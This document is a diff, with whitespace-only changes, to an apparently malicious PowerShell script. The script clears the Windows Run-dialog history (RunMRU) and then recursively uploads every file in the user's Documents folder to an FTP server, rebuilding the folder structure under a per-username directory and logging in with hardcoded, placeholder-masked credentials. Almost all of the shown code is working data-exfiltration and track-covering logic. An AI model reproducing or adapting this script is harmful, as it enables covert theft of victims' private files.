@@ -9,13 +9,13 @@ remove-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 $FTPHost = 'ftp://ftp.xxxxx.com/' + $env:username + '/'
 $FTPUser = 'xxxxx'
 $FTPPass = 'xxxxx'
- 
+
 #Directory where to find files to upload
 $UploadFolder = "$env:userprofile\Documents\"
-  
-$webclient = New-Object System.Net.WebClient 
-$webclient.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass)  
- 
+
+$webclient = New-Object System.Net.WebClient
+$webclient.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass)
+
 $SrcEntries = Get-ChildItem $UploadFolder -Recurse
 $Srcfolders = $SrcEntries | Where-Object{$_.PSIsContainer}
 $SrcFiles = $SrcEntries | Where-Object{!$_.PSIsContainer}
@@ -25,18 +25,18 @@ try {
 $makeDirectory = [System.Net.WebRequest]::Create($FTPHost);
 $makeDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
 $makeDirectory.Method = [System.Net.WebRequestMethods+FTP]::MakeDirectory;
-$makeDirectory.GetResponse(); 
+$makeDirectory.GetResponse();
 }
 catch [Net.WebException] {}
 
 # Create FTP Directory/SubDirectory If Needed - Start
 foreach($folder in $Srcfolders)
-{    
-    $SrcFolderPath = $UploadFolder  -replace "\\","\\" -replace "\:","\:"   
+{
+    $SrcFolderPath = $UploadFolder  -replace "\\","\\" -replace "\:","\:"
     $DesFolder = $folder.Fullname -replace $SrcFolderPath,$FTPHost
     $DesFolder = $DesFolder -replace "\\", "/"
     # Write-Output $DesFolder
- 
+
     try
         {
             $makeDirectory = [System.Net.WebRequest]::Create($DesFolder);
@@ -61,7 +61,7 @@ foreach($folder in $Srcfolders)
         }
 }
 # Create FTP Directory/SubDirectory If Needed - Stop
- 
+
 # Upload Files - Start
 foreach($entry in $SrcFiles)
 {
@@ -71,8 +71,8 @@ foreach($entry in $SrcFiles)
     $DesFile = $SrcFullname -replace $SrcFilePath,$FTPHost
     $DesFile = $DesFile -replace "\\", "/"
     # Write-Output $DesFile
- 
-    $uri = New-Object System.Uri($DesFile) 
+
+    $uri = New-Object System.Uri($DesFile)
     $webclient.UploadFile($uri, $SrcFullname)
 }
 # Upload Files - Stop
